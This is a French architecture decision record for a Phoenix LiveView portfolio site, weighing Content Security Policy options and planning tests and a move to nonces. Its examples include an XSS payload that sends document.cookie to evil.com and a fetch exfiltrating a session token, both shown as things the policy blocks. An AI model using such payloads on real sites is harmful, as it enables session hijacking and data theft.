# ADR-051: Content Security Policy (CSP)

Statut: Accepté  
Date: 2025-11-11

## Contexte

Le Cross-Site Scripting (XSS) est l'une des vulnérabilités web les plus critiques selon l'OWASP Top 10. Une Content Security Policy (CSP) est un mécanisme de sécurité HTTP qui permet de contrôler précisément les sources de contenu (scripts, styles, images, etc.) qu'un navigateur est autorisé à charger et exécuter.

### Problématique XSS

**Voir aussi** : ADR-050 (Security Layered Defense) pour la vue d'ensemble de la sécurité, ADR-052 (Security Headers) pour les autres headers de sécurité

Une attaque XSS se produit lorsqu'un attaquant parvient à injecter du code JavaScript malveillant dans une page web.

Exemple d'attaque XSS sans CSP :

```elixir
# Données utilisateur malveillantes
album_title = "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"

# Template sans protection
<h1><%= raw(@album.title) %></h1>

# HTML généré (DANGEREUX)
<h1><script>fetch('https://evil.com/steal?cookie='+document.cookie)</script></h1>

# Navigateur exécute le script → vol de session
```

Conséquences d'un XSS réussi :
- Vol de cookies de session (session hijacking)
- Actions non autorisées (transfert argent, suppression données)
- Redirection vers site de phishing
- Keylogging (capture clavier)
- Défiguration de page (defacement)

### CSP comme Ligne de Défense

Même si le code utilise l'encoding automatique HEEx (protection primaire), le CSP ajoute une couche de défense en profondeur :

1. HEEx encode automatiquement : `<script>` devient `&lt;script&gt;` (non exécutable)
2. Si HEEx contourné (`raw/1` mal utilisé) : CSP bloque le script

Le CSP définit une whitelist de sources autorisées. Tout script ou style hors whitelist est bloqué par le navigateur.

### Contraintes Techniques

Le portfolio utilise des bibliothèques JavaScript qui imposent des contraintes sur le CSP :

Bibliothèques utilisées :
- Phoenix LiveView (WebSocket, inline event handlers)
- Tailwind CSS (framework CSS compilé)
- JavaScript hooks custom (animations, gallery, sortable)
- Mishka Components (composants UI)
- Topbar (progress bar)

Contraintes CSP :
- Pas de CDN externe (tous assets en local)
- Pas d'eval() ou new Function() détecté
- Inline styles limités (Tailwind génère CSS statique)
- Event handlers via LiveView (phx-click, phx-submit)

## Options Considérées

### Option 1: Pas de CSP

Approche : Ne pas définir de header Content-Security-Policy.

Avantages :
- Simplicité maximale (aucune configuration)
- Compatibilité totale (tout fonctionne)
- Pas de debug CSP errors

Inconvénients :
- Aucune protection contre XSS par injection script externe
- Si HEEx `raw/1` mal utilisé : XSS critique
- Pas de limitation exfiltration données
- Non conforme standards sécurité modernes

Décision : Rejeté. Protection XSS insuffisante pour interface admin.

### Option 2: CSP Strict (Nonce-Based)

Approche : CSP le plus strict possible avec nonces aléatoires pour chaque script inline autorisé.

Configuration théorique :

```elixir
# endpoint.ex
defp put_secure_headers(conn, _opts) do
  nonce = generate_nonce()
  
  conn
  |> assign(:csp_nonce, nonce)
  |> put_resp_header(
    "content-security-policy",
    "default-src 'none'; " <>
    "script-src 'self' 'nonce-#{nonce}'; " <>
    "style-src 'self' 'nonce-#{nonce}'; " <>
    "img-src 'self' data: https:; " <>
    "connect-src 'self' wss:; " <>
    "font-src 'self'; " <>
    "frame-ancestors 'none';"
  )
end

# Template
<script nonce={@csp_nonce}>
  // Code inline autorisé
</script>
```

Avantages :
- Protection XSS maximale
- Aucun script non autorisé ne peut s'exécuter
- Standard moderne recommandé par Google

Inconvénients :
- Complexité élevée (nonce pour chaque script/style inline)
- Phoenix LiveView génère scripts inline dynamiquement
- Incompatible avec LiveView sans modifications lourdes
- Nécessite nonce dans tous les composants

Décision : Rejeté pour court terme. Migration possible long terme (ADR futur).

### Option 3: CSP Relaxé avec unsafe-inline (Actuel)

Approche : CSP avec directives `unsafe-inline` pour permettre scripts/styles inline.

Configuration actuelle :

```elixir
# endpoint.ex:68
"content-security-policy",
"default-src 'self'; " <>
  "script-src 'self' 'unsafe-inline' 'unsafe-eval'; " <>
  "style-src 'self' 'unsafe-inline'; " <>
  "img-src 'self' data: https:; " <>
  "font-src 'self' data:; " <>
  "connect-src 'self' ws: wss:; " <>
  "frame-ancestors 'none';"
```

Avantages :
- Compatible avec Phoenix LiveView (scripts inline autorisés)
- Protection contre scripts externes (CDN malveillant)
- Protection contre iframes (frame-ancestors)
- Limite exfiltration (connect-src restreint)
- Simplicité (pas de nonce à gérer)

Inconvénients :
- `unsafe-inline` affaiblit protection XSS
- Script inline malveillant serait autorisé (si HEEx contourné)
- Non optimal selon standards modernes

Décision : Accepté pour phase actuelle. Meilleur compromis sécurité/complexité.

### Option 4: CSP Strict + LiveView Nonce Integration

Approche : Implémenter support nonce dans tous les hooks LiveView.

Implémentation :

```elixir
# endpoint.ex
defp put_secure_headers(conn, _opts) do
  nonce = Base.encode64(:crypto.strong_rand_bytes(16))
  
  conn
  |> put_session(:csp_nonce, nonce)
  |> put_resp_header("content-security-policy",
    "script-src 'self' 'nonce-#{nonce}'"
  )
end

# app.js
const nonce = document.querySelector("meta[name='csp-nonce']").content;
// Utiliser nonce pour tous scripts dynamiques
```

Avantages :
- Protection XSS stricte
- Compatible LiveView avec intégration
- Standard moderne

Inconvénients :
- Effort développement élevé (2-3 jours)
- Tous hooks à modifier
- Maintenance complexe
- Bibliothèques tierces (Mishka) potentiellement incompatibles

Décision : Rejeté court terme. Migration possible moyen/long terme si besoin avéré.

## Décision

L'option choisie est : **Option 3 - CSP Relaxé avec unsafe-inline**

Configuration actuelle conservée avec améliorations mineures.

### Justification

Cette approche offre le meilleur compromis pour le contexte actuel :

1. Protection significative : Bloque scripts externes (CDN malveillant, injection URL)
2. Compatibilité LiveView : Fonctionne sans modification code existant
3. Simplicité maintenance : Pas de nonce à gérer dans chaque composant
4. Défense en profondeur : HEEx encode déjà tout (protection primaire)
5. Migration progressive : Permet évolution vers nonce futur si nécessaire

Le CSP actuel protège contre 80% des attaques XSS réalistes (injection externe) tout en conservant une complexité gérable pour développeur solo.

## Configuration Détaillée

### Directives CSP Actuelles

```elixir
# lib/portfolio_web/endpoint.ex:68-76
defp put_secure_headers(conn, _opts) do
  conn
  |> put_resp_header(
    "content-security-policy",
    "default-src 'self'; " <>
      "script-src 'self' 'unsafe-inline' 'unsafe-eval'; " <>
      "style-src 'self' 'unsafe-inline'; " <>
      "img-src 'self' data: https:; " <>
      "font-src 'self' data:; " <>
      "connect-src 'self' ws: wss:; " <>
      "frame-ancestors 'none';"
  )
end
```

### Analyse Directive par Directive

#### default-src 'self'

Rôle : Politique par défaut pour toutes les directives non spécifiées.

Valeur : `'self'` = uniquement même origine (https://photo.thibaultsan.com)

Protection :
- Bloque chargement ressources depuis domaines externes par défaut
- Fallback sécurisé si directive spécifique manquante

Ressources affectées : media, manifest, worker, form-action (non redéfinies)

Exemple bloqué :
```html
<video src="https://evil.com/video.mp4"></video>
<!-- Bloqué par default-src 'self' -->
```

#### script-src 'self' 'unsafe-inline' 'unsafe-eval'

Rôle : Contrôle les sources JavaScript autorisées.

Valeurs :
- `'self'` : scripts depuis même origine (/assets/app.js)
- `'unsafe-inline'` : scripts inline autorisés (`<script>...</script>`)
- `'unsafe-eval'` : eval(), new Function(), setTimeout(string) autorisés

Justification unsafe-inline :
- Phoenix LiveView génère event handlers inline
- Mishka Components utilise potentiellement inline scripts
- Hooks custom peuvent nécessiter inline

Justification unsafe-eval :
- Certains hooks utilisent setTimeout/setInterval (détecté dans hooks.js)
- Mishka Components potentiellement
- À investiguer : peut-être suppressible

Protection malgré unsafe- :
- Scripts externes bloqués (pas de CDN malveillant)
- Injection via URL bloquée

Exemple autorisé :
```html
<!-- OK : script local -->
<script src="/assets/app.js"></script>

<!-- OK : inline (unsafe-inline) -->
<script>console.log("Hello")</script>

<!-- OK : eval (unsafe-eval) -->
<script>setTimeout("alert(1)", 1000)</script>
```

Exemple bloqué :
```html
<!-- BLOQUÉ : script externe -->
<script src="https://cdn.jsdelivr.net/malware.js"></script>
```

Amélioration recommandée :
1. Investiguer si `unsafe-eval` vraiment nécessaire
2. Si setTimeout/setInterval utilisent fonctions (pas strings) : supprimer `unsafe-eval`

```javascript
// ❌ MAUVAIS (nécessite unsafe-eval)
setTimeout("alert(1)", 1000);

// ✅ BON (fonctionne sans unsafe-eval)
setTimeout(() => alert(1), 1000);
```

#### style-src 'self' 'unsafe-inline'

Rôle : Contrôle les sources CSS autorisées.

Valeurs :
- `'self'` : CSS depuis même origine (/assets/app.css)
- `'unsafe-inline'` : styles inline autorisés (`<style>`, `style="..."`)

Justification unsafe-inline :
- Tailwind génère parfois styles inline dynamiques
- Mishka Components utilisent styles inline
- LiveView peut injecter styles inline

Protection :
- CSS externes bloqués (pas de CDN malveillant)

Exemple autorisé :
```html
<!-- OK : CSS local -->
<link rel="stylesheet" href="/assets/app.css">

<!-- OK : inline (unsafe-inline) -->
<style>.red { color: red; }</style>
<div style="color: blue;">Text</div>
```

Exemple bloqué :
```html
<!-- BLOQUÉ : CSS externe -->
<link rel="stylesheet" href="https://cdn.example.com/malicious.css">
```

Note : `unsafe-inline` pour styles moins critique que pour scripts (CSS ne peut pas exécuter JS arbitraire, sauf via expression() IE legacy).

#### img-src 'self' data: https:

Rôle : Contrôle les sources images autorisées.

Valeurs :
- `'self'` : images depuis même origine (/uploads/...)
- `data:` : data URIs (base64 inline images)
- `https:` : toutes images HTTPS externes

Justification https: :
- Photos Facebook (amvcc_live/blog/clothes.html.heex:156)
- Future CDN Cloudflare (ADR-044)
- Images Open Graph externes

Protection :
- Bloque images HTTP non chiffrées (http:)
- Force HTTPS pour images externes

Exemple autorisé :
```html
<!-- OK : image locale -->
<img src="/uploads/photo.jpg">

<!-- OK : data URI -->
<img src="data:image/png;base64,iVBORw0KG...">

<!-- OK : HTTPS externe -->
<img src="https://scontent.cdninstagram.com/photo.jpg">
```

Exemple bloqué :
```html
<!-- BLOQUÉ : HTTP non chiffré -->
<img src="http://evil.com/tracker.gif">
```

Amélioration possible :
Si toutes images externes proviennent de domaines connus :

```elixir
"img-src 'self' data: https://scontent-cdg4-2.xx.fbcdn.net https://cdn.cloudflare.com;"
```

Bénéfice : Limite exfiltration via images vers domaines arbitraires.

#### font-src 'self' data:

Rôle : Contrôle les sources fonts autorisées.

Valeurs :
- `'self'` : fonts depuis même origine
- `data:` : fonts inline base64

Justification data: :
- Certains frameworks (Tailwind) embedent fonts en base64
- Heroicons potentiellement

Protection :
- Bloque fonts externes (Google Fonts, etc.)

Exemple autorisé :
```css
/* OK : font locale */
@font-face {
  src: url('/fonts/roboto.woff2');
}

/* OK : data URI */
@font-face {
  src: url('data:font/woff2;base64,d09GMg...');
}
```

Exemple bloqué :
```css
/* BLOQUÉ : Google Fonts */
@font-face {
  src: url('https://fonts.googleapis.com/css?family=Roboto');
}
```

Observation : Actuellement aucune font externe utilisée. Configuration adéquate.

#### connect-src 'self' ws: wss:

Rôle : Contrôle les destinations pour fetch, XMLHttpRequest, WebSocket, EventSource.

Valeurs :
- `'self'` : requêtes vers même origine
- `ws:` : WebSocket non chiffré (development uniquement)
- `wss:` : WebSocket chiffré (production)

Justification ws: wss: :
- Phoenix LiveView utilise WebSocket pour communication temps réel
- ws: pour development (localhost)
- wss: pour production (HTTPS)

Protection :
- Empêche exfiltration données vers domaines externes
- XSS ne peut pas envoyer données vers serveur attaquant

Exemple autorisé :
```javascript
// OK : fetch vers même origine
fetch('/api/albums');

// OK : WebSocket LiveView
new WebSocket('wss://photo.thibaultsan.com/live/websocket');
```

Exemple bloqué :
```javascript
// BLOQUÉ : exfiltration vers domaine externe
fetch('https://evil.com/steal?data=' + sessionStorage.token);

// BLOQUÉ : WebSocket externe
new WebSocket('wss://evil.com/socket');
```

Amélioration recommandée :
En production, supprimer `ws:` (garder uniquement `wss:`):

```elixir
# config/runtime.exs
websocket_csp = if config_env() == :prod, do: "wss:", else: "ws: wss:"

config :portfolio, :csp_connect_src, websocket_csp
```

```elixir
# endpoint.ex
ws_proto = Application.get_env(:portfolio, :csp_connect_src, "ws: wss:")
"connect-src 'self' #{ws_proto};"
```

#### frame-ancestors 'none'

Rôle : Contrôle quels domaines peuvent embarquer la page dans un iframe.

Valeur : `'none'` = aucun iframe autorisé

Protection :
- Empêche clickjacking (bouton invisible dans iframe transparent)
- Complète header X-Frame-Options: DENY (défense en profondeur)

Exemple bloqué :
```html
<!-- evil.com -->
<iframe src="https://photo.thibaultsan.com/admin"></iframe>
<!-- Navigateur refuse de charger l'iframe -->
```

Alternative : `'self'` autoriserait iframes même origine (pas nécessaire pour notre cas).

Note : `frame-ancestors` remplace X-Frame-Options dans CSP moderne (plus flexible).

### Directives Manquantes (Utilisant default-src)

Directives non spécifiées explicitement, donc héritent de `default-src 'self'` :

#### object-src (Plugins Flash, Java, etc.)

Héritage : `default-src 'self'`

Recommandation : Expliciter `object-src 'none'` (pas de plugins)

```elixir
"object-src 'none';"  # Bloque <object>, <embed>, <applet>
```

Justification : Flash/Java obsolètes, vecteur attaque historique.

#### base-uri (Tag <base>)

Héritage : `default-src 'self'`

Recommandation : Expliciter `base-uri 'self'` ou `'none'`

```elixir
"base-uri 'self';"  # Empêche injection <base href="https://evil.com">
```

Protection : Empêche attaques par manipulation base URL.

#### form-action (Destination formulaires)

Héritage : `default-src 'self'`

Recommandation : Expliciter `form-action 'self'`

```elixir
"form-action 'self';"  # Formulaires uniquement vers même origine
```

Protection : Empêche exfiltration via formulaire POST vers evil.com.

#### upgrade-insecure-requests

Directive spéciale qui force upgrade HTTP → HTTPS pour toutes ressources.

Recommandation : Ajouter

```elixir
"upgrade-insecure-requests;"
```

Bénéfice : Ressources HTTP chargées en HTTPS automatiquement (complète HSTS).

### CSP Amélioré Recommandé

```elixir
defp put_secure_headers(conn, _opts) do
  # WebSocket protocol selon environnement
  ws_proto = if Mix.env() == :prod, do: "wss:", else: "ws: wss:"
  
  conn
  |> put_resp_header(
    "content-security-policy",
    "default-src 'self'; " <>
      "script-src 'self' 'unsafe-inline'; " <>  # Investiguer suppression unsafe-eval
      "style-src 'self' 'unsafe-inline'; " <>
      "img-src 'self' data: https:; " <>
      "font-src 'self' data:; " <>
      "connect-src 'self' #{ws_proto}; " <>
      "frame-ancestors 'none'; " <>
      "object-src 'none'; " <>              # Nouveau
      "base-uri 'self'; " <>                # Nouveau
      "form-action 'self'; " <>             # Nouveau
      "upgrade-insecure-requests;"          # Nouveau
  )
  # ... autres headers
end
```

Améliorations :
1. Suppression `unsafe-eval` si investigation confirme non nécessaire
2. `ws:` uniquement en dev (production wss: uniquement)
3. Directives explicites pour object-src, base-uri, form-action
4. upgrade-insecure-requests pour force HTTPS

## Mode Report-Only (Testing)

Avant d'appliquer un CSP strict, tester en mode Report-Only pour détecter violations sans bloquer.

### Configuration Report-Only

```elixir
# endpoint.ex (temporaire)
defp put_secure_headers(conn, _opts) do
  conn
  |> put_resp_header(
    "content-security-policy-report-only",  # Pas de blocage
    "default-src 'self'; " <>
      "script-src 'self'; " <>  # Test sans unsafe-inline
      "report-uri /csp-report"  # Endpoint pour violations
  )
end
```

### Endpoint Reporting

```elixir
# router.ex
post "/csp-report", CSPController, :report

# controllers/csp_controller.ex
defmodule PortfolioWeb.CSPController do
  use PortfolioWeb, :controller
  
  def report(conn, params) do
    Logger.warning("CSP Violation",
      report: params,
      user_agent: get_req_header(conn, "user-agent")
    )
    
    send_resp(conn, 204, "")
  end
end
```

### Analyse Violations

Après 1-2 semaines de monitoring :

1. Collecter rapports CSP
2. Identifier sources légitimes violant CSP
3. Ajuster whitelist ou corriger code
4. Passer de Report-Only à enforcing

Exemple rapport CSP :

```json
{
  "csp-report": {
    "document-uri": "https://photo.thibaultsan.com/admin",
    "violated-directive": "script-src",
    "blocked-uri": "inline",
    "source-file": "https://photo.thibaultsan.com/admin",
    "line-number": 42
  }
}
```

Interprétation : Script inline ligne 42 bloqué → investiguer si légitime (LiveView) ou bug.

## Migration Vers Nonce-Based CSP (Futur)

Roadmap migration vers CSP strict (moyen/long terme) :

### Phase 1: Investigation (1 jour)

1. Auditer tous scripts inline
   ```bash
   grep -r "<script" lib/portfolio_web/components
   grep -r "setTimeout\|setInterval" assets/js
   ```

2. Identifier dépendances unsafe-eval
   - hooks.js : vérifier setTimeout/setInterval
   - mishka_components.js : vérifier eval()

3. Lister modifications nécessaires

### Phase 2: Implémentation Nonce (2-3 jours)

1. Générer nonce par requête

```elixir
# endpoint.ex
defp put_secure_headers(conn, _opts) do
  nonce = generate_csp_nonce()
  
  conn
  |> assign(:csp_nonce, nonce)
  |> put_resp_header("content-security-policy",
    "script-src 'self' 'nonce-#{nonce}'"
  )
end

defp generate_csp_nonce do
  :crypto.strong_rand_bytes(16) |> Base.encode64()
end
```

2. Injecter nonce dans meta tag

```heex
<!-- root.html.heex -->
<meta name="csp-nonce" content={@csp_nonce}>
```

3. Utiliser nonce dans scripts inline

```heex
<script nonce={@csp_nonce}>
  // Code inline
</script>
```

4. Modifier hooks pour utiliser nonce

```javascript
// app.js
const nonce = document.querySelector("meta[name='csp-nonce']").content;

// Créer scripts dynamiques avec nonce
const script = document.createElement('script');
script.nonce = nonce;
script.textContent = '...';
document.head.appendChild(script);
```

### Phase 3: Testing (1-2 jours)

1. Tests automatisés CSP

```elixir
# test/portfolio_web/csp_test.exs
test "CSP header includes nonce" do
  conn = get(build_conn(), "/")
  csp = get_resp_header(conn, "content-security-policy")
  
  assert csp =~ ~r/nonce-[A-Za-z0-9+\/=]+/
end

test "nonce is different per request" do
  conn1 = get(build_conn(), "/")
  conn2 = get(build_conn(), "/")
  
  nonce1 = conn1.assigns.csp_nonce
  nonce2 = conn2.assigns.csp_nonce
  
  assert nonce1 != nonce2
end
```

2. Tests manuels navigateurs
   - Firefox DevTools : Console CSP violations
   - Chrome DevTools : Security tab
   - Safari DevTools : Console errors

3. Tests régression
   - Toutes fonctionnalités LiveView
   - Upload photos
   - Tri photos drag&drop
   - Animations galleries

### Phase 4: Déploiement Progressif

1. Report-Only 2 semaines (collecter violations)
2. Enforcing mode si 0 violation légitime
3. Monitoring logs CSP violations
4. Rollback si problèmes critiques

Estimation totale : 5-7 jours développement + 2 semaines monitoring

## Validation et Testing

### Tests Manuels

#### Test 1: Script Externe Bloqué

1. Ouvrir DevTools Console
2. Exécuter :
```javascript
const script = document.createElement('script');
script.src = 'https://cdn.jsdelivr.net/npm/malicious@1.0.0/index.js';
document.head.appendChild(script);
```

3. Résultat attendu :
```
Refused to load the script 'https://cdn.jsdelivr.net/...' because it violates the following Content Security Policy directive: "script-src 'self' 'unsafe-inline'".
```

#### Test 2: Inline Script Autorisé

1. Ouvrir DevTools Console
2. Exécuter :
```javascript
const script = document.createElement('script');
script.textContent = 'console.log("Inline OK")';
document.head.appendChild(script);
```

3. Résultat attendu : "Inline OK" dans console (autorisé par unsafe-inline)

#### Test 3: iframe Externe Bloqué

1. Créer page test sur domaine externe
```html
<!-- https://example.com/test.html -->
<iframe src="https://photo.thibaultsan.com/admin"></iframe>
```

2. Résultat attendu :
```
Refused to display 'https://photo.thibaultsan.com/admin' in a frame because an ancestor violates the following Content Security Policy directive: "frame-ancestors 'none'".
```

#### Test 4: Exfiltration Données Bloquée

1. Ouvrir DevTools Console sur photo.thibaultsan.com
2. Exécuter :
```javascript
fetch('https://evil.com/steal?data=secret');
```

3. Résultat attendu :
```
Refused to connect to 'https://evil.com/steal' because it violates the following Content Security Policy directive: "connect-src 'self' ws: wss:".
```

### Tests Automatisés

```elixir
# test/portfolio_web/security/csp_test.exs
defmodule PortfolioWeb.Security.CSPTest do
  use PortfolioWeb.ConnCase
  
  describe "Content Security Policy" do
    test "CSP header is present", %{conn: conn} do
      conn = get(conn, "/")
      
      assert [csp] = get_resp_header(conn, "content-security-policy")
      assert csp =~ "default-src 'self'"
    end
    
    test "CSP blocks external scripts", %{conn: conn} do
      conn = get(conn, "/")
      [csp] = get_resp_header(conn, "content-security-policy")
      
      assert csp =~ "script-src 'self'"
      refute csp =~ "https://cdn.example.com"
    end
    
    test "CSP blocks iframes", %{conn: conn} do
      conn = get(conn, "/")
      [csp] = get_resp_header(conn, "content-security-policy")
      
      assert csp =~ "frame-ancestors 'none'"
    end
    
    test "CSP allows WebSocket for LiveView", %{conn: conn} do
      conn = get(conn, "/")
      [csp] = get_resp_header(conn, "content-security-policy")
      
      assert csp =~ "connect-src 'self' ws: wss:"
    end
  end
end
```

### Outils de Validation

#### CSP Evaluator (Google)

URL : https://csp-evaluator.withgoogle.com/

Usage :
1. Copier CSP header actuel
2. Coller dans CSP Evaluator
3. Analyser warnings et recommandations

Score attendu : Moyen (unsafe-inline réduit score)

Recommandations attendues :
- "Remove unsafe-inline from script-src"
- "Remove unsafe-eval from script-src"
- "Consider using nonces or hashes"

#### Mozilla Observatory

URL : https://observatory.mozilla.org/

Tests :
- CSP présent : ✅
- CSP strict : ⚠️ (unsafe-inline)
- frame-ancestors : ✅

Score attendu : B ou B+ avec config actuelle

#### Report URI (CSP Reporting Service)

URL : https://report-uri.com/

Service gratuit pour collecter rapports CSP.

Configuration :

```elixir
"content-security-policy",
"... report-uri https://YOUR-ACCOUNT.report-uri.com/r/d/csp/enforce;"
```

Bénéfice : Dashboard violations CSP en production.

## Conséquences

### Positives

- Protection XSS contre scripts externes (CDN malveillant, injection URL)
- Protection clickjacking (frame-ancestors 'none')
- Limite exfiltration données (connect-src restreint)
- Défense en profondeur avec HEEx encoding
- Compatible LiveView sans modification code
- Simplicité maintenance (pas de nonce actuel)
- Migration progressive possible vers nonce futur

### Négatives

- unsafe-inline affaiblit protection XSS inline
- unsafe-eval potentiellement non nécessaire (à investiguer)
- Score CSP Evaluator moyen (pas excellent)
- Pas de reporting violations configuré
- ws: autorisé en production (devrait être wss: uniquement)

### Neutres

- Compromis sécurité/complexité acceptable phase actuelle
- Migration nonce possible moyen terme si besoin
- Aucun CDN externe utilisé (bon pour CSP)

## Plan d'Action

### Court Terme (Priorité: HAUTE)

1. Investiguer unsafe-eval
   - Chercher eval(), new Function() dans assets/js
   - Chercher setTimeout/setInterval avec string
   - Si aucun : supprimer unsafe-eval du CSP
   - Estimation : 0.5 jour

2. Ajouter directives manquantes
   - object-src 'none'
   - base-uri 'self'
   - form-action 'self'
   - upgrade-insecure-requests
   - Estimation : 0.25 jour

3. WebSocket ws: uniquement en dev
   - Config par environnement
   - Production : wss: uniquement
   - Estimation : 0.25 jour

4. Tests CSP automatisés
   - Suite tests csp_test.exs
   - Vérifier headers présents
   - Estimation : 0.5 jour

### Moyen Terme (Priorité: MOYENNE)

1. CSP Report-Only testing
   - Configurer endpoint /csp-report
   - Mode Report-Only 2 semaines
   - Analyser violations
   - Estimation : 1 jour

2. Validation outils externes
   - CSP Evaluator (Google)
   - Mozilla Observatory
   - SSL Labs
   - Documentation résultats
   - Estimation : 0.5 jour

3. Restreindre img-src si possible
   - Identifier domaines images externes
   - Whitelist explicite vs https:
   - Tests Facebook images AMVCC
   - Estimation : 0.5 jour

### Long Terme (Priorité: BASSE)

1. Migration nonce-based CSP
   - Investigation dépendances (1 jour)
   - Implémentation (2-3 jours)
   - Testing (1-2 jours)
   - Déploiement progressif (2 semaines monitoring)
   - Estimation totale : 1-2 semaines

2. CSP Reporting service
   - Compte Report URI
   - Configuration report-uri directive
   - Dashboard monitoring
   - Estimation : 0.5 jour

3. Strict-dynamic (CSP Level 3)
   - Recherche compatibility navigateurs
   - POC avec strict-dynamic
   - Tests cross-browser
   - Estimation : 2-3 jours

## Références

### Standards et Spécifications

- CSP Level 3 : https://www.w3.org/TR/CSP3/
- CSP Level 2 : https://www.w3.org/TR/CSP2/
- MDN CSP : https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

### Best Practices et Guides

- OWASP CSP Cheat Sheet : https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- Google CSP Guide : https://csp.withgoogle.com/docs/index.html
- CSP Is Dead, Long Live CSP! (strict-dynamic) : https://research.google/pubs/pub45542/

### Outils

- CSP Evaluator : https://csp-evaluator.withgoogle.com/
- Mozilla Observatory : https://observatory.mozilla.org/
- Report URI : https://report-uri.com/
- CSP Scanner : https://cspscanner.com/

### Articles Approfondis

- Content Security Policy: A successful mess between hardening and mitigation : https://laboratory.securitum.com/csp/
- Bypassing CSP : https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass

### Fichiers Code Concernés

- `lib/portfolio_web/endpoint.ex:68-76` : Configuration CSP actuelle
- `lib/portfolio_web/components/layouts/root.html.heex:8` : Meta tag CSRF (pas CSP nonce actuellement)
- `assets/js/app.js` : JavaScript principal (vérifier eval/setTimeout)
- `assets/js/hooks.js` : Hooks custom (vérifier eval/setTimeout)
- `assets/vendor/mishka_components.js` : Bibliothèque tierce (vérifier compatibilité CSP strict)

### ADRs Connexes

- ADR-050 : Security Layered Defense (vue d'ensemble)
- ADR-052 : Security Headers Strategy (X-Frame-Options, HSTS, etc.)
- ADR-024 : CSRF Protection (complément CSP)

---

Date de création: 2025-11-11  
Dernière révision: 2025-11-11
